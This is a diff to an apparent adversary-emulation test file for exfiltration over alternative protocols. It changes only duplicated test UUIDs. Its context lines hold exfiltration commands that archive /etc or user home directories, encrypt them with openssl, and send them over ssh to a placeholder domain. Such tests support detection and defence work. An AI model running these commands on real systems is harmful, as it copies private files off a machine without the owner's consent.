@@ -4,7 +4,7 @@ display_name: Exfiltration Over Alternative Protocol
 
 atomic_tests:
 - name: Exfiltration Over Alternative Protocol - SSH
-  uuid: 79fc8a51-bc1b-4d6f-85f8-f6cb1388ce47
+  uuid: 7c6deb90-07b5-41ed-b2dd-d5fade6d4264
 
   description: |
     Input a domain and test Exfiltration over SSH
@@ -37,7 +37,7 @@ atomic_tests:
       ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 
 - name: Exfiltration Over Alternative Protocol - SSH
-  uuid: 79fc8a51-bc1b-4d6f-85f8-f6cb1388ce47
+  uuid: 44b8a5d8-d111-4c38-9aaa-d90c65f1533b
 
   description: |
     Input a domain and test Exfiltration over SSH
@@ -70,7 +70,7 @@ atomic_tests:
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
 
 - name: Exfiltration Over Alternative Protocol - HTTP
-  uuid: 79fc8a51-bc1b-4d6f-85f8-f6cb1388ce47
+  uuid: f9f5cbec-aee3-4a8b-bd18-d3117592fbc7
 
   description: |
     A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
